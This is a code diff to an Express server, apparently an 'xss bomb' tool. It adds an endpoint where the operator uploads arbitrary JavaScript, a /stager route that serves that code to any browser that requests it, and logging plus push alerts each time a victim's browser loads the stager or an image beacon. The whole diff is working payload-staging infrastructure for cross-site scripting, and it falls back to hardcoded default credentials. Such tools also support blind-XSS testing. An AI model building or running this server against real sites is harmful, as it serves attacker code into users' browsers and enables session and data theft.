@@ -11,6 +11,7 @@ require('dotenv').config({ path: path.resolve(__dirname, '/.env') })
 
 let savedPushTokens = [];
 let notification_array = [];
+let source_code = '';
 
 var port = process.env.port || 8080;
 var username = process.env.username || 'xss';
@@ -19,6 +20,18 @@ var password = process.env.password || 'bomb';
 app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json());
 app.use(cors());
+
+function get_date() {
+  let ts = Date.now();
+  let date_ob = new Date(ts);
+  let date = date_ob.getDate();
+  let month = date_ob.getMonth() + 1;
+  let year = date_ob.getFullYear();
+  let hours = date_ob.getHours();
+  let minutes = date_ob.getMinutes();
+  
+  return (year + "-" + month + "-" + date + "-" + hours + ":" + minutes);
+}
 
 const handlePushTokens = ({ title, body }) => {
   let notifications = [];
@@ -64,8 +77,8 @@ app.listen(port, function() {
 });
 
 app.post("/token", (req, res) => {
-  if (req.body.token == undefined || req.body.username == undefined ||
-      req.body.password == undefined) {
+  if (req.body.token == undefined || req.body.username != username ||
+      req.body.password != password) {
     res.send({ data: "ko" });
     return
   }
@@ -75,7 +88,7 @@ app.post("/token", (req, res) => {
 });
 
 app.post("/notifications", (req, res) => {
-  if (req.body.username == undefined || req.body.password == undefined) {
+  if (req.body.username != username || req.body.password != password) {
     res.send({ data: "ko" });
     return
   }
@@ -87,21 +100,41 @@ app.post("/message", (req, res) => {
   notification_array.push({
     'route': '/message',
     'content': req.body,
+    'date': get_date(),
     'user-agent': req.headers['user-agent']
   });
   console.log(`Received message, with title: ${req.body.title}`);
   res.send(`Received message, with title: ${req.body.title}`);
 });
 
+app.post("/setstager", (req, res) => {
+  if (req.body.username != username || req.body.password != password) {
+    res.send({ data: "ko" });
+    return
+  }
+  source_code = req.body.source;
+  res.send({ data: "ok" });
+});
+
 app.get("/stager", (req, res) => {
-  console.log(req.headers);
-  res.sendFile(__dirname + "/public/stager.js");
+  console.log();
+  if (req.headers['user-agent'] != "xss_bomb_app") {
+    notification_array.push({
+      'route': '/stager',
+      'content': undefined,
+      'date': get_date(),
+      'user-agent': req.headers['user-agent']
+    });
+    handlePushTokens({title: "xss - stager", body: req.headers['user-agent']});
+  }
+  res.send(source_code);
 });
 
 app.get("/pic", (req, res) => {
   notification_array.push({
     'route': '/pic',
     'content': undefined,
+    'date': get_date(),
     'user-agent': req.headers['user-agent']
   });
   handlePushTokens({title: "xss - picture", body: req.headers['user-agent']});
